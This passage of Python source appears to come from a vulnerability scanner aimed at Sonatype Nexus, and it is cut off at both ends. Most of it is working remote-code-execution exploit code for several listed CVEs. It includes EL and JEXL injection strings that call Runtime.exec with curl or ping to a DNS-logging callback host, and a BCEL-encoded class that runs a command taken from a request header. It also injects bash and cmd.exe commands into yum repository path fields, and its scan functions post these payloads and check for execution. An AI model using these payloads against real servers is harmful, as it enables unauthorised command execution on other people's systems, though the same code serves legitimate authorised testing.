8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}"]
  }
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                    '404': self.cmd
                })
            },
            {
                'path': 'service/rest/beta/repositories/go/group',
                'data': '''{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["$\\\\C{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('curl DNSdomain')}"]
  }
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
            {
                'path': 'service/rest/beta/repositories/go/group',
                'data': '''{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["$\\\\C{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('ping -c 4 DNSdomain')}"]
  }
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
            {
                'path': 'service/rest/beta/repositories/go/group',
                'data': '''{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["$\\\\C{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('ping DNSdomain')}"]
  }
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
            {
                'path': 'service/rest/beta/repositories/go/group',
                'data': '''{
  "name": "internal",
  "online": true,
  "storage": {
    "blobStoreName": "default",
    "strictContentTypeValidation": true
  },
  "group": {
    "memberNames": ["$\\\\C{233*233*233}"]
  }
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            }
        ]

        # ! --------------------------------------------------cve_2020_10204_payloads

        self.cve_2020_10204_payloads = [
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"2","firstName":"admin","lastName":"User","email":"admin@example.org","status":"active","roles":["nxadmin$\\\\C{' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}"]}],"type":"rpc","tid":11}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest',
                    '404': self.cmd
                })
            },
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"2","firstName":"admin","lastName":"User","email":"admin@example.org","status":"active","roles":["nxadmin$\\\\C{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('curl DNSdomain')}"]}],"type":"rpc","tid":11}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"2","firstName":"admin","lastName":"User","email":"admin@example.org","status":"active","roles":["nxadmin$\\\\C{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('ping -c 4 DNSdomain')}"]}],"type":"rpc","tid":11}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"2","firstName":"admin","lastName":"User","email":"admin@example.org","status":"active","roles":["nxadmin$\\\\C{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('ping DNSdomain')}"]}],"type":"rpc","tid":11}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            },
            {
                'path': 'service/extdirect',
                'data': '''{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"2","firstName":"admin","lastName":"User","email":"admin@example.org","status":"active","roles":["nxadmin$\\\\B{233*233}"]}],"type":"rpc","tid":11}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                })
            }
        ]

        # ! --------------------------------------------------cve_2019_5475_payloads

        self.cve_2019_5475_payloads = [
            # * "key":"createrepoPath"
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"bash -c COMMAND &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo${IFS}' + self.md)
            },
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"/bin/bash -c COMMAND &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo${IFS}' + self.md)
            },
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"cmd.exe /c COMMAND &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo/' + self.md)
            },
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"C:/Windows/System32/cmd.exe /c COMMAND &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo/' + self.md)
            },
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"C:\\\\Windows\\\\System32\\\\cmd.exe /c COMMAND &"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo/' + self.md)
            },
            # * "key":"mergerepoPath"
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"bash -c COMMAND &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo${IFS}' + self.md)
            },
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"/bin/bash -c COMMAND &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo${IFS}' + self.md)
            },
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"cmd.exe /c COMMAND &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo/' + self.md)
            },
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"C:/Windows/System32/cmd.exe /c COMMAND &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo/' + self.md)
            },
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"C:\\\\Windows\\\\System32\\\\cmd.exe /c COMMAND &"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo/' + self.md)
            },
        ]

        # ! --------------------------------------------------cve_2019_15588_payloads

        self.cve_2019_15588_payloads = [
            # * createrepoPath
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"/bin/bash -c COMMAND || /createrepo"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo${IFS}' + self.md)
            },
            # * mergerepoPath
            {
                'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"/bin/bash -c COMMAND || /mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'.replace('COMMAND', 'echo${IFS}' + self.md)
            },
            # ! Windows的Payload暂不支持
            # {
            #     'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"C:/Windows/System32/notepad.exe || /createrepo"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'
            # },
            # {
            #     'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"C:\\\\Windows\\\\System32\\\\notepad.exe || /createrepo"},{"key":"mergerepoPath","value":"mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'
            # },
            # {
            #     'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"C:/Windows/System32/notepad.exe || /mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'
            # },
            # {
            #     'data': '{"typeId":"yum","enabled":true,"properties":[{"key":"maxNumberParallelThreads","value":"10"},{"key":"createrepoPath","value":"createrepo"},{"key":"mergerepoPath","value":"C:\\\\Windows\\\\System32\\\\notepad.exe || /mergerepo"}],"id":"002f54bc25593c69","notes":"Automatically added on Thu Sep 01 13:08:15 UTC 2019"}'
            # },
        ]

    # ! --------------------------------------------------

    def cve_2019_7238_scan(self, url):
        ''' 3.14.0及之前版本中, 存在一处基于OrientDB自定义函数的任意JEXL表达式执行功能, 
                这处功能存在未授权访问，可以导致任意命令执行
        '''
        sessid = '2649e3a08398e1940ab6b95a7f9a20a5'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-7238'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2019_7238_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
            
            path = payload['path']
            data = payload['data'].replace('DNSdomain', dns_domain)
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(3)
            if ((self.md in check.check_res(res.text, self.md))     # * 可以运行命令, 有回显
                or (md in dns.result(md, sessid))                   # * 可以运行命令, 无回显
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    # ! --------------------------------------------------

    def cve_2020_10199_scan(self, url):
        ''' 3.21.1及之前版本中, 存在一处任意EL表达式注入漏洞 '''
        sessid = '429d9e16ee5d3c8fd4575342bf02b72e'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2020-10199'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2020_10199_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path']
            data = payload['data'].replace('DNSdomain', dns_domain)
            headers = payload['headers']
            target = url + path

            # todo Referer && Origin
            if ('http://' in url):
                proto = 'http://'
            else:
                proto = 'https://'
            headers['Referer'] = proto + logger.get_domain(url)
            headers['Origin'] = proto + logger.get_domain(url)

            # todo Nexus 登录后的csrf token(如果有)
            csrf_token = re.search(r'NX-ANTI-CSRF-TOKEN=0\.\d*', str(self.headers))
            if (csrf_token):
                NX_ANTI_CSRF_TOKEN = csrf_token.group().split('=')
                headers[NX_ANTI_CSRF_TOKEN[0]] = NX_ANTI_CSRF_TOKEN[1]

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(3)
            if ((self.md in check.check_res(res.text, self.md))     # * 可以运行命令, 有回显
                or (md in dns.result(md, sessid))                   # * 可以运行命令, 无回显
                or ('12649337' in res.text)                         # * 可以执行EL表达式
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    # ! --------------------------------------------------cve_2020_10204_scan

    def cve_2020_10204_scan(self, url):
        ''' 3.21.1及之前版本中, 存在一处任意EL表达式注入漏洞, CVE-2018-16621的绕过 '''
        sessid = '405b1f856a5cad633f19caf344586cce'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2020-10204'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2020_10204_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path']
            data = payload['data'].replace('DNSdomain', dns_domain)
            headers = payload['headers']
            target = url + path

            # todo Referer && Origin
            if ('http://' in url):
                proto = 'http://'
            else:
                proto = 'https://'
            headers['Referer'] = proto + logger.get_domain(url)
            headers['Origin'] = proto + logger.get_domain(url)

            # todo Nexus 登录后的csrf token(如果有)
            csrf_token = re.search(r'NX-ANTI-CSRF-TOKEN=0\.\d*', str(self.headers))
            if (csrf_token):
                NX_ANTI_CSRF_TOKEN = csrf_token.group().split('=')
                headers[NX_ANTI_CSRF_TOKEN[0]] = NX_ANTI_CSRF_TOKEN[1]

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(3)
            if ((self.md in check.check_res(res.text, self.md))     # * 可以运行命令, 有回显
                or (md in dns.result(md, sessid))                   # * 可以运行命令, 无回显
                or ('54289' in res.text)                            # * 可以执行EL表达式
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    # ! --------------------------------------------------cve_2019_5475_scan

    def cve_2019_5475_scan(self, url):
        ''' Nexus内置插件Yum Repository的RCE命令注入漏洞, 其最早被披露于Hackerone '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-5475'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Nexus-UI': 'true'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        try:
            # todo 1) Referer && Origin
            if ('http://' in url):
                proto = 'http://'
            else:
                proto = 'https://'
            headers['Referer'] = proto + logger.get_domain(url)
            headers['Origin'] = proto + logger.get_domain(url)

            # todo 2) Nexus 登录后的csrf token(如果有)
            csrf_token = re.search(r'NX-ANTI-CSRF-TOKEN=0\.\d*', str(self.headers))
            if (csrf_token):
                NX_ANTI_CSRF_TOKEN = csrf_token.group().split('=')
                headers[NX_ANTI_CSRF_TOKEN[0]] = NX_ANTI_CSRF_TOKEN[1]

            # todo 3) 获取Yum: Configuration的id
            path = 'service/siesta/capabilities/'
            res1 = requests.get(
                url + path, 
                timeout=self.timeout, 
                headers=headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res1.status_code, res1)                        # * LOG

            # * 如果没有找到Yum: Configuration的id, 则退出当前POC
            yum_id_re = r'<id>.{16}</id><notes>Automatically added on.{0,40}</notes><enabled>(true|false)</enabled><typeId>yum</typeId>.*<key>createrepoPath</key><value>.{0,30}</value>'
            if (not re.search(yum_id_re, res1.text)):
                return None

            yum_id = re.search(yum_id_re, res1.text).group(0)[4:20]                 # * 提取id
            path += yum_id                                                          # * 路径 + yum id
            # * Payload需要的Headers
            headers.update({'Accept': 'application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json'})

            for payload in self.cve_2019_5475_payloads:
                sleep(0.5)

                data = payload['data']
                target = url + path

                vul_info['path'] = path
                vul_info['data'] = data
                vul_info['target'] = target

                res2 = requests.put(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res2.status_code, res2)                        # * LOG

                if ((self.md in check.check_res(res2.text, '${IFS}'+self.md))
                    or (self.md in check.check_res(res2.text, '/'+self.md))
                ):
                    results = {
                        'Target': target,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Request': res2
                    }
                    return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None

    # ! --------------------------------------------------cve_2019_15588_scan

    def cve_2019_15588_scan(self, url):
        ''' CVE-2019-5475的绕过 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-15588'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Nexus-UI': 'true'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        try:
            # todo 1) Referer && Origin
            if ('http://' in url):
                proto = 'http://'
            else:
                proto = 'https://'
            headers['Referer'] = proto + logger.get_domain(url)
            headers['Origin'] = proto + logger.get_domain(url)

            # todo 2) Nexus 登录后的csrf token(如果有)
            csrf_token = re.search(r'NX-ANTI-CSRF-TOKEN=0\.\d*', str(self.headers))
            if (csrf_token):
                NX_ANTI_CSRF_TOKEN = csrf_token.group().split('=')
                headers[NX_ANTI_CSRF_TOKEN[0]] = NX_ANTI_CSRF_TOKEN[1]

            # todo 3) 获取Yum: Configuration的id
            path = 'service/siesta/capabilities/'
            res1 = requests.get(
                url + path, 
                timeout=self.timeout, 
                headers=headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res1.status_code, res1)                        # * LOG

            # * 如果没有找到Yum: Configuration的id, 则退出当前POC
            yum_id_re = r'<id>.{16}</id><notes>Automatically added on.{0,40}</notes><enabled>(true|false)</enabled><typeId>yum</typeId>.*<key>createrepoPath</key><value>.{0,50}</value>'
            if (not re.search(yum_id_re, res1.text, re.I|re.M|re.U|re.S)):
                return None

            yum_id = re.search(yum_id_re, res1.text, re.I|re.M|re.U|re.S).group(0)[4:20]                 # * 提取id
            path += yum_id                                                # * 路径 + yum id
            # * Payload需要的Headers
            headers.update({'Accept': 'application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json'})

            for payload in self.cve_2019_15588_payloads:
                data = payload['data']
                target = url + path

